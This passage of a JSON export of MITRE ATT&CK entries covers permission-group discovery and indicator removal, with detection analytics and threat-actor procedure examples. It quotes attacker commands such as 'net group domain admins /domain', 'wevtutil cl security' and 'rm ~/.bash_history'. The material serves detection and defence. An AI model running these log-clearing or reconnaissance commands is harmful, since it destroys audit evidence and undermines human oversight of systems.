      "ZeroClearehas used a vulnerable signed VBoxDrv driver to bypass Microsoft Driver Signature Enforcement (DSE) protections and subsequently load the unsignedRawDiskdriver.[48]",
      "ZIRCONIUMhas exploited CVE-2017-0005 for local privilege escalation.[49]",
      "Zoxhas the ability to leverage local and remote exploits to escalate privileges.[50]"
    ]
  },
  "T1069": {
    "Name": "Permission Groups Discovery",
    "Description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.[1]",
    "Detects": [
      "Monitor for logging, messaging, and other artifacts provided by cloud services.",
      "Monitor executed commands and arguments acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor for an extracted list of ACLs of available groups and/or their associated settings.",
      "Monitor for contextual data about a group which describes group and activity around it.",
      "Monitor for newly constructed processes and/or command-lines for actions that could be taken to gather system and network information. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained."
    ],
    "Procedure Examples": [
      "APT3has a tool that can enumerate the permissions associated with Windows groups.[2]",
      "APT41usednet groupcommands to enumerate various Windows user groups and permissions.[3]",
      "Carbonuses thenet groupcommand.[4]",
      "FIN13has enumerated all users and roles from a victim's main treasury system.[5]",
      "IcedIDhas the ability to identify Workgroup membership.[6]",
      "MURKYTOPhas the capability to retrieve information about groups.[7]",
      "ShimRatReportergathered the local privileges for the infected host.[8]",
      "Siloscapechecks for Kubernetes node permissions.[9]",
      "During theSolarWinds Compromise,APT29used theGet-ManagementRoleAssignmentPowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.[10]",
      "TA505has used TinyMet to enumerate members of privileged groups.[11]TA505has also runnet group /domain.[12]",
      "TrickBotcan identify the groups the user on a compromised host belongs to.[13]",
      "Volt Typhoonhas used commercial tools, LOTL utilities, and appliances already present on the system for group and user discovery.[14]"
    ]
  },
  "T1069.001": {
    "Name": "Permission Groups Discovery:Local Groups",
    "Description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such asnet localgroupof theNetutility,dscl . -list /Groupson macOS, andgroupson Linux can list local groups.",
    "Detects": [
      "Monitor for executed commands and arguments that may attempt to find local system groups and permission settings.",
      "Monitor for logging that may suggest a list of available groups and/or their associated settings has been extracted, ex. Windows EID 4798 and 4799.",
      "Monitor for API calls associated with finding local system groups and permission settings, such as NetLocalGroupEnum. Other API calls relevant to Local Group discovery include NetQueryDisplayInformation and NetGetDisplayInformationIndex.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor newly executed processes that may attempt to find local system groups and permission settings.Note: Event IDs are for Sysmon (Event ID 1 - process creation) and Windows Security Log (Event ID 4688 - a new process has been created). The logic in the Analytic looks for any instances of net.exe used for local user/group discovery; although this utility is not normally used for benign purposes, such usage by system administrator actions may trigger false positives.Analytic 1 - Local Permission Group Discovery(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"net.exe\" AND (  CommandLine=\"netuser\" OR  CommandLine=\"netgroup\" OR  CommandLine=\"netlocalgroup\" OR  CommandLine=\"get-localgroup\" OR  CommandLine=\"get-ADPrincipalGroupMembership*\" )"
    ],
    "Procedure Examples": [
      "admin@338actors used the following command following exploitation of a machine withLOWBALLmalware to list local groups:net localgroup administrator >> %temp%\\download[1]",
      "BloodHoundcan collect information about local groups and members.[2]",
      "DuringC0015, the threat actors used the commandnet localgroup \"adminstrator\"to identify accounts with local administrator rights.[3]",
      "Caterpillar WebShellcan obtain a list of local groups of users from a system.[4]",
      "Chimerahas usednet localgroup administratorsto identify  accounts with local administrative rights.[5]",
      "Cobalt Strikecan usenet localgroupto list local groups on a system.[6]",
      "Emissaryhas the capability to execute the commandnet localgroup administrators.[7]",
      "Epicgathers information on local group names.[8]",
      "Exbytechecks whether the process is running with privileged local access during execution.[9]",
      "Flagprohas been used to execute thenet localgroup administratorscommand on a targeted system.[10]",
      "FlawedAmmyyenumerates the privilege level of the victim during the initial infection.[11][12]",
      "Gomirchecks the effective group ID of its process when initially executed to determine if it is in group 0, denoting superuser privileges in Linux environments.[13]",
      "Helminthhas checked the local administrators group.[14]",
      "HEXANEhas runnet localgroupto enumerate local groups.[15]",
      "JPINcan obtain the permissions of the victim user.[16]",
      "Kazuargathers information about local groups and members.[17]",
      "Kwampirscollects a list of users belonging to the local users and administrators groups with the commandsnet localgroup administratorsandnet localgroup users.[18]",
      "LunarWebcan discover local group memberships.[19]",
      "Commands such asnet groupandnet localgroupcan be used inNetto gather information about and manipulate groups.[20]",
      "OilRighas usednet localgroup administratorsto find local administrators on compromised systems.[21][22]",
      "DuringOperation CuckooBees, the threat actors used thenet groupcommand as part of their advanced reconnaissance.[23]",
      "DuringOperation Wocao, threat actors used the commandnet localgroup administratorsto list all administrators part of a local group.[24]",
      "OSInfohas enumerated the local administrators group.[25]",
      "PoshC2contains modules, such asGet-LocAdmfor enumerating permission groups.[26]",
      "POWRUNERmay collect local group information by runningnet localgroup administratorsor a series of other commands on a victim.[27]",
      "QakBotcan usenet localgroupto enable discovery of local groups.[28][29]",
      "SILENTTRINITYcan obtain a list of local groups and members.[30]",
      "Sys10collects the group name of the logged-in user and sends it to the C2.[31]",
      "Tonto Teamhas used theShowLocalGroupDetailscommand to identify administrator, user, and guest accounts on a compromised host.[32]",
      "Turlahas usednet localgroupandnet localgroup Administratorsto enumerate group information, including members of the local administrators group.[33]",
      "Volt Typhoonhas runnet localgroup administratorsin compromised environments to enumerate accounts.[34]"
    ]
  },
  "T1069.002": {
    "Name": "Permission Groups Discovery:Domain Groups",
    "Description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such asnet group /domainof theNetutility,dscacheutil -q groupon macOS, andldapsearchon Linux can list domain-level groups.",
    "Detects": [
      "Monitor for executed commands and arguments that may attempt to find domain-level groups and permission settings.",
      "Monitor for logging that may suggest a list of available groups and/or their associated settings has been extracted, ex. Windows EID 4798 and 4799.",
      "Monitor for API calls associated with finding domain-level groups and permission settings, such asNetGroupEnum. Other API calls relevant to Domain Group discovery includeNetQueryDisplayInformationandNetGetDisplayInformationIndex.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor newly executed processes that may attempt to find domain-level groups and permission settings.For Linux, auditing frameworks that support alerting on process creation, including the audit daemon (auditd), can be used to alert on invocations of commands such asldapsearch.For MacOS, utilities that work in concert with Apple’s Endpoint Security Framework such as Process Monitor can be used to track usage of commands such asdscacheutil -q group.Note: Event IDs are for Sysmon (Event ID 10 - process access) and Windows Security Log (Event ID 4688 - a new process has been created).Analytic 1 - Local Permission Group Discovery - Net(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image= \"net.exe\" OR Image= \"net1.exe\") AND CommandLine=\"group/domain*\")"
    ],
    "Procedure Examples": [
      "AdFindcan enumerate domain groups.[1][2][3][4]",
      "BADHATCHcan usenet.exe group \"domain admins\" /domainto identify Domain Administrators.[5]",
      "BlackCatcan determine if a user on a compromised host has domain admin privileges.[6]",
      "BloodHoundcan collect information about domain groups and members.[7]",
      "Brute Ratel C4can usenet groupfor discovery on targeted domains.[8]",
      "DuringC0015, the threat actors use the commandnet group \"domain admins\" /domto enumerate domain groups.[9]",
      "Cobalt Strikecan identify targets by querying account groups on a domain contoller.[10]",
      "CrackMapExeccan gather the user accounts within domain groups.[11]",
      "Dragonflyhas used batch scripts to enumerate administrators and users in the domain.[12]",
      "dsquerycan be used to gather information on permission groups within a domain.[13][14]",
      "Egregorcan conduct Active Directory reconnaissance using tools such as Sharphound orAdFind.[15]",
      "FIN7has used the commandnet group \"domain admins\" /domainto enumerate domain groups.[16]",
      "Gootloadercan determine if a targeted system is part of an Active Directory domain by  expanding the %USERDNSDOMAIN%  environment variable.[17]",
      "GRIFFONhas used a reconnaissance module that can be used to retrieve Windows domain membership information.[18]",
      "Helminthhas checked for the domain admin group and Exchange Trusted Subsystem groups using the commandsnet group Exchange Trusted Subsystem /domainandnet group domain admins /domain.[19]",
      "INC Ransomhas enumerated domain groups on targeted hosts.[20]",
      "Inceptionhas used specific malware modules to gather domain membership.[21]",
      "Ke3changperforms discovery of permission groupsnet group /domain.[22]",
      "Kwampirscollects a list of domain groups with the commandnet localgroup /domain.[23]",
      "LAPSUS$has used the AD Explorer tool to enumerate groups on a victim's network.[24]",
      "Latrodectuscan identify domain groups throughcmd.exe /c net group \"Domain Admins\" /domain.[25][26]",
      "Commands such asnet group /domaincan be used inNetto gather information about and manipulate groups.[27]",
      "OilRighas usednet group /domain,net group \"domain admins\" /domain, andnet group \"Exchange Trusted Subsystem\" /domainto find domain group permission settings.[28]",
      "OSInfospecifically looks for Domain Admins and power users within the domain.[29]",
      "POWRUNERmay collect domain group information by runningnet group /domainor a series of other commands on a victim.[30]",
      "REvilcan identify the domain membership of a compromised host.[31][32][33]",
      "SILENTTRINITYcan useSystem.DirectoryServicesnamespace to retrieve domain group information.[34]",
      "During theSolarWinds Compromise,APT29usedAdFindto enumerate domain groups.[35]",
      "SoreFangcan enumerate domain groups by executingnet.exe group /domain.[36]",
      "ToddyCathas executednet group \"domain admins\" /domfor discovery on compromised machines.[37]",
      "Turlahas usednet group \"Domain Admins\" /domainto identify domain administrators.[38]",
      "Volt Typhoonhas runnet groupin compromised environments to discover domain groups.[39]",
      "WellMesscan identify domain group membership for the current user.[40]"
    ]
  },
  "T1069.003": {
    "Name": "Permission Groups Discovery:Cloud Groups",
    "Description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. TheGet-MsolRolePowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts[1][2].Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The commandaz ad user get-member-groupswill list groups associated to a user account for Azure while the API endpointGET https://cloudidentity.googleapis.com/v1/groupslists group resources available to a user for Google.[3][4][5]In AWS, the commandsListRolePoliciesandListAttachedRolePoliciesallow users to enumerate the policies attached to a role.[6]Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWSGetBucketAclAPI[7]. Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
    "Detects": [
      "Monitor for events collected that may attempt to find cloud groups and permission settings.",
      "Monitor for executed commands and arguments that may attempt to find cloud groups and permission settings.",
      "Monitor for an extracted list of available groups and/or their associated setting",
      "Contextual data about a group which describes group and activity around it that may attempt to find cloud groups and permission settings.",
      "Monitor newly executed processes that may attempt to find cloud groups and permission settings."
    ],
    "Procedure Examples": [
      "AADInternalscan enumerate Azure AD groups.[8]",
      "DuringC0027,Scattered Spideraccessed Azure AD to download bulk lists of group members and their Active Directory attributes.[9]",
      "Pacucan enumerate IAM permissions.[10]",
      "ROADToolscan enumerate Azure AD groups.[11]"
    ]
  },
  "T1070": {
    "Name": "Indicator Removal",
    "Description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
    "Detects": [
      "Monitor logs for abnormal modifications to application settings, such as the creation of malicious Exchange transport rules.",
      "Monitor executed commands and arguments that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for a file that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for contextual file data that may show signs of deletion or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for changes made to a file may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for changes made to firewall rules, especially unexpected modifications that may potentially be related to allowing and/or cleaning up previous tampering that enabled malicious network traffic.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor for API calls that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for newly executed processes that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for changes made to scheduled jobs that may attempt to remove artifacts on a host system.",
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for unexpected deletions of user accounts. Windows event logs may highlight activity associated with an adversary's attempt to remove an account (e.g.,Event ID 4726 - A user account was deleted).Alerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate account modification events with other indications of malicious activity where possible.",
      "Monitor windows registry keys that may be deleted or alter generated artifacts on a host system, including logs or captured files such as quarantined malware.",
      "Monitor for changes made to windows registry keys or values that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
    ],
    "Procedure Examples": [
      "APT42has cleared Chrome browser history.[1]",
      "APT5has used the THINBLOOD utility to clear SSL VPN log files located at/home/runtime/logs.[2][3]",
      "Bankshotdeletes all artifacts associated with the malware from the infected machine.[4]",
      "BlackEnergyhas removed the watermark associated with enabling theTESTSIGNINGboot configuration option by removing the relevant strings in theuser32.dll.muiof the system.[5]",
      "BPFDoorclears the file location/proc/<PID>/environremoving all environment variables for the process.[6]",
      "CSPY Downloaderhas the ability to remove values it writes to the Registry.[7]",
      "DuringCutting Edge, threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.[8][9]",
      "DarkWatchmancan uninstall malicious components from the Registry, stop processes, and clear the browser history.[10]",
      "Donutcan erase file references to payloads in-memory after being reflectively loaded and executed.[11]",
      "DUSTTRAPrestores the.textsection of compromised DLLs after malicious code is loaded into memory and before the file is closed.[12]",
      "EVILNUMhas a function called \"DeleteLeftovers\" to remove certain artifacts of the attack.[13]",
      "Flagprocan close specific Windows Security and Internet Explorer dialog boxes to mask external connections.[14]",
      "FunnyDreamhas the ability to clean traces of malware deployment.[15]",
      "HermeticWipercan disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.[16][17]",
      "IPsec Helpercan delete various registry keys related to its execution and use.[18]",
      "Lazarus Grouphas restored maliciousKernelCallbackTablecode to its original state after the process execution flow has been hijacked.[19]",
      "Mazehas used the \"Wow64RevertWow64FsRedirection\" function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.[20]",
      "Metamorfohas a command to delete a Registry key it uses,\\Software\\Microsoft\\Internet Explorer\\notes.[21]",
      "MultiLayer Wiperuses a batch script to clear file system cache memory via theProcessIdleTasksexport inadvapi32.dllas an anti-analysis and anti-forensics technique.[22]",
      "Neoichorcan clear the browser history on a compromised host by changing theClearBrowsingHistoryOnExitvalue to 1 in theHKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\PrivacyRegistry key.[23]",
      "Orzcan overwrite Registry settings to reduce its visibility on the victim.[24]",
      "Rising Suncan clear a memory blog in the process by overwriting it with junk bytes.[25]",
      "Sardonichas the ability to delete created WMI objects to evade detections.[26]",
      "SDBbothas the ability to clean up and remove data structures from a compromised host.[27]",
      "ShadowPadhas deleted arbitrary Registry values.[28]",
      "Sibotwill delete an associated registry key if a certain server response is received.[29]",
      "SILENTTRINITYcan remove artifacts from the compromised host, including created Registry keys.[30]",
      "During theSolarWinds Compromise,APT29temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.[31]",
      "Stuxnetcan delete OLE Automation and SQL stored procedures used to store malicious payloads.[32]",
      "SUNBURSTremoved HTTP proxy registry values to clean up traces of execution.[33]"
    ]
  },
  "T1070.001": {
    "Name": "Indicator Removal:Clear Windows Event Logs",
    "Description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.With administrator privileges, the event logs can be cleared with the following utility commands:wevtutil cl systemwevtutil cl applicationwevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI orPowerShell. For example, adversaries may use the PowerShell commandRemove-EventLog -LogName Securityto delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.[1]Adversaries may also attempt to clear logs by directly deleting the stored log files withinC:\\Windows\\System32\\winevt\\logs\\.",
    "Detects": [
      "Monitor executed commands and arguments for actions that would delete Windows event logs (via PowerShell) such asRemove-EventLog -LogName Security.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on attempts to Clear Windows Event Logs. In particular, Powershell has a built-in Clear-EventLog cmdlet that allows for a specified log to be cleared.",
      "Monitor for unexpected deletion of Windows event logs (via native binaries) and may also generate an alterable event (Event ID 1102: \"The audit log was cleared\"). When an eventlog is cleared, a new event is created that alerts that the eventlog was cleared. For Security logs, its event code 1100 and 1102. For System logs, it is event code 104.It is unlikely that event log data would be cleared during normal operations, and it is likely that malicious attackers may try to cover their tracks by clearing an event log. When an event log gets cleared, it is suspicious.This is often done using wevtutil, a legitimate tool provided by Microsoft. This action interferes with event collection and notification, and may lead to a security event going undetected, thereby potentially leading to further compromise of the network.Alerting when a Clear Event Log is generated could point to this intruder technique. Centrally collecting events has the added benefit of making it much harder for attackers to cover their tracks. Event Forwarding permits sources to forward multiple copies of a collected event to multiple collectors, thus enabling redundant event collection. Using a redundant event collection model can minimize the single point of failure risk.Attackers may set the option of the sources of events withLimit-EventLog -LogName Security -OverflowAction DoNotOverwriteto not delete old Evenlog when the .evtx is full. By default the Security Log size is configured with the minimum value of 20 480KB (~23 000 EventLog). So if this option is enabled, all the new EventLogs will be automatically deleted. We can detect this behavior with the Security EventLog 1104.Attackers may delete .evtx withdel C:\\Windows\\System32\\winevt\\logs\\Security.evtxorRemove-Item C:\\Windows\\System32\\winevt\\logs\\Security.evtxafter having disabled and stopped the Eventlog service. As the EventLog service is disabled and stopped, the .evtx files are no longer used by this service and can be deleted. The new EventLog will be Unavailable until the configuration is reset.Attackers may use the powershell commandRemove-EventLog -LogName Securityto unregister source of events that are part of Windows (Application, Security…). This command deletes the security EventLog (which also generates EventId 1102) but the new Eventlogs are still recorded until the system is rebooted . After the System is rebooted, the Security log is unregistered and doesn’t log any new Eventlog. However logs generated between the command and the reboot are still available in the .evtx file.Analytic 1 - User Activity from Clearing Event Logs(source=\"WinEventLog:Security\" EventCode IN (1100, 1102, 1104)) OR (source=\"WinEventLog:System\" EventCode IN (104))",
      "Monitor for Windows API calls that may clear Windows Event Logs to hide the activity of an intrusion.",
      "Monitor for newly executed processes that may clear Windows Event Logs to hide the activity of an intrusion. In an attempt to clear traces after compromising a machine, threat actors often try to clear Windows Event logs. This is often done using \"wevtutil\", a legitimate tool provided by Microsoft. This action interferes with event collection and notification, and may lead to a security event going undetected, thereby potentially leading to further compromise of the network.Note: This search query looks for wevtutil, Clear-EventLog, Limit-EventLog, Remove-Item or Remove-EventLog inside a command that may cause the system to remove Windows Event logs.Analytic 1 - Clearing Windows Logs with Wevtutil(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image=wevtutilCommandLine=cl(CommandLine=SystemOR CommandLine=SecurityOR CommandLine=SetupOR CommandLine=Application) OR Clear-EventLog OR Limit-EventLog OR (Remove-Item AND .evtx) OR Remove-EventLog)"
    ],
    "Procedure Examples": [
      "Apostlewill attempt to delete all event logs on a victim machine following file wipe activity.[2]",
      "APT28has cleared event logs, including by using the commandswevtutil cl Systemandwevtutil cl Security.[3][4]",
      "APT32has cleared select event log entries.[5]",
      "APT38clears Window Event logs and Sysmon logs from the system.[6]",
      "APT41attempted to remove evidence of some of its activity by clearing Windows security and system events.[7]",
      "Aquatic Pandaclears Windows Event Logs following activity to evade defenses.[8]",
      "BlackCatcan clear Windows event logs usingwevtutil.exe.[9]",
      "TheBlackEnergycomponent KillDisk is capable of deleting Windows Event Logs.[10]",
      "Chimerahas cleared event logs on compromised hosts.[11]",
      "Dragonflyhas cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.[12]",
      "DUSTTRAPcan delete infected system log information.[13]",
      "FIN5has cleared event logs from victims.[14]",
      "FIN8has cleared logs during post compromise cleanup activities.[15]",
      "FinFisherclears the system event logs usingOpenEventLog/ClearEventLog APIs.[16][17]",
      "gh0st RATis able to wipe event logs.[18][19]",
      "HAFNIUMhas cleared actor-performed actions from logs.[20]",
      "HermeticWipercan overwrite theC:\\Windows\\System32\\winevt\\Logsfile on a targeted system.[21]",
      "HermeticWizardhas the ability to usewevtutil cl systemto clear event logs.[21]",
      "Hydraqcreates a backdoor through which remote attackers can clear all system event logs.[22][23]",
      "Indrik Spiderhas usedCobalt Striketo empty log files.[24]Additionally,Indrik Spiderhas cleared all event logs usingwevutil.[25]",
      "KillDiskdeletes Application, Security, Setup, and System Windows Event Logs.[10]",
      "LockBit 2.0can delete log files through the use of wevtutil.[26][27][28][29]",
      "LockBit 3.0can delete log files on targeted systems.[30][31]",
      "Lucifercan clear and remove event logs.[32]",
      "Mafaldacan delete Windows Event logs by invoking theOpenEventLogWandClearEventLogWfunctions.[33]",
      "Meteorcan useWevtutilto remove Security, System and Application Event Viewer logs.[34]",
      "MultiLayer Wiperremoves Windows event logs during execution.[35]",
      "NotPetyauseswevtutilto clear the Windows event logs.[36][37]",
      "Olympic Destroyerwill attempt to clear the System and Security event logs usingwevtutil.[38]",
      "DuringOperation Wocao, the threat actors deleted all Windows system and security event logs using/Q /c wevtutil cl systemand/Q /c wevtutil cl security.[39]",
      "Playhas used tools to remove log files on targeted systems.[40][41]",
      "Pupyhas a module to clear event logs with PowerShell.[42]",
      "RansomHubcan delete events from the Security, System, and Application logs.[43]",
      "RunningRATcontains code to clear event logs.[44]",
      "ShrinkLockercallsWevtutilto clear the Windows PowerShell and Microsoft-Windows-Powershell/Operational logs.[45]",
      "SynAckclears event logs.[46]",
      "Volt Typhoonhas selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity.[47]",
      "Wevtutilcan be used to clear system and security event logs from the system.[48][3]",
      "ZxShellhas a command to clear system event logs.[49]"
    ]
  },
  "T1070.002": {
    "Name": "Indicator Removal:Clear Linux or Mac System Logs",
    "Description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the/var/log/directory. Subfolders in this directory categorize logs by their related functions, such as:[1]/var/log/messages:: General and system-related messages/var/log/secureor/var/log/auth.log: Authentication logs/var/log/utmpor/var/log/wtmp: Login records/var/log/kern.log: Kernel logs/var/log/cron.log: Crond logs/var/log/maillog: Mail server logs/var/log/httpd/: Web server access and error logs",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to remove or overwrite system logs.",
      "Monitor for unexpected deletion of a system log file, typically stored in /var/logs or /Library/Logs.",
      "Monitor for changes made to system log files, typically stored in  /var/log or /Library/Logs, for unexpected modifications to access permissions and attributes"
    ],
    "Procedure Examples": [
      "JumbledPathcan clear logs on all devices used along its connection path to compromised network infrastructure.[2]",
      "MacMacan clear possible malware traces such as application logs.[3]",
      "Protonremoves logs from/var/logsand/Library/logs.[4]",
      "Rockehas cleared log files within the /var/log/ folder.[5]",
      "Salt Typhoonhas cleared logs including .bash_history, auth.log, lastlog, wtmp, and btmp.[2]",
      "Sea Turtlehas overwritten Linux system logs and unsets the Bash history file (effectively removing logging) during intrusions.[6]",
      "TeamTNThas removed system logs from/var/log/syslog.[7]",
      "UPSTYLEclears error logs after reading embedded commands for execution.[8]"
    ]
  },
  "T1070.003": {
    "Name": "Indicator Removal:Clear Command History",
    "Description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variableHISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history filerm ~/.bash_history.Adversaries may also leverage aNetwork Device CLIon network devices to clear command history data (clear loggingand/orclear history).[1]On ESXi servers, command history may be manually removed from the/var/log/shell.logfile.[2]On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by thePSReadLinemodule. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.ThePSReadLinecommand history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtby default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.[3]Adversaries may run the PowerShell commandClear-Historyto flush the entire command history from a current PowerShell session. This, however, will not delete/flush theConsoleHost_history.txtfile. Adversaries may also delete theConsoleHost_history.txtfile or edit its contents to hide PowerShell commands they have run.[4][5]",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to clear command history, such asClear-Historyon Windows orclear logging/clear historyvia a Network Device CLI in AAA logs, or to disable writing command history, such ashistory -cin bash/zsh .Analytic 1 - Powershell Commands(source=\"WinEventLog:Microsoft-Windows-Powershell/Operational\" EventCode=\"4103\") (CommandLine=\"Clear-History\" OR   (CommandLine=\"Remove-Item\" AND CommandLine=\"ConsoleHost_history.text*\"))",
      "Monitor for unexpected deletion of a command history file, such asConsoleHost_history.txt,~/.zsh_history,~/.bash_history, or/var/log/shell.log.Analytic 1 - Deletion of command history files(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"23\") OR (source=\"WinEventLog:Security\" EventCode=\"4663\") FilePath LIKE '%ConsoleHost_history.txt%' AND   ObjectType == \"File\" AND   (UserAccessList LIKE '%1537%' OR     UserAccessList LIKE '%DELETE%'))",
      "Monitor for changes made to command history files, such asConsoleHost_history.txt,~/.zsh_history,~/.bash_history, or/var/log/shell.log, for unexpected modifications to contents, access permissions, and attributes.Analytic 1 : Modification of access rights to command history files(source=\"WinEventLog:Security\" EventCode IN (4663, 4670) AND Path=\"ConsoleHost_history.txt\" AND ObjectType=\"File\")     AND (UserAccessList=\"1539\" OR UserAccessList=\"WRITE_DAC\") OR (ObjectNewSd=\";FA\" OR ObjectNewSd=\";FW\" OR ObjectNewSd=\";BU*\")",
      "Monitor for the suspicious execution of processes that may clear the command history of a compromised account to conceal the actions undertaken during an intrusion.Analytic 1 - Clear Powershell Console Command History(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND  (CommandLine=\"rm (Get-PSReadlineOption).HistorySavePath\" OR   CommandLine=\"del (Get-PSReadlineOption).HistorySavePath\" OR    CommandLine=\"Set-PSReadlineOption –HistorySaveStyle SaveNothing\" OR   CommandLine=\"Remove-Item (Get-PSReadlineOption).HistorySavePath\" OR   (CommandLine=\"del\" AND CommandLine=\"Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\"))",
      "Monitor for an attempts by a user to gain access to a network or computing resource, often by providing credentials via remote terminal services, that do not have a corresponding entry in a command history file."
    ],
    "Procedure Examples": [
      "APT41attempted to remove evidence of some of its activity by deleting Bash histories.[6]",
      "APT5has cleared the command history on targeted ESXi servers.[7]",
      "Aquatic Pandacleared command history in Linux environments to remove traces of activity after operations.[8]",
      "Hildegardhas used history -c to clear script shell logs.[9]",
      "J-magiccan overwrite previously executed command line arguments.[10]",
      "Kobaloscan remove all command history on compromised hosts.[11]",
      "Lazarus Grouphas routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility.[12]",
      "Magic Houndhas removed mailbox export requests from compromised Exchange servers.[13]",
      "menuPasshas usedWevtutilto remove PowerShell execution logs.[14]",
      "TeamTNThas cleared command history withhistory -c.[15][16]"
    ]
  },
  "T1070.004": {
    "Name": "Indicator Removal:File Deletion",
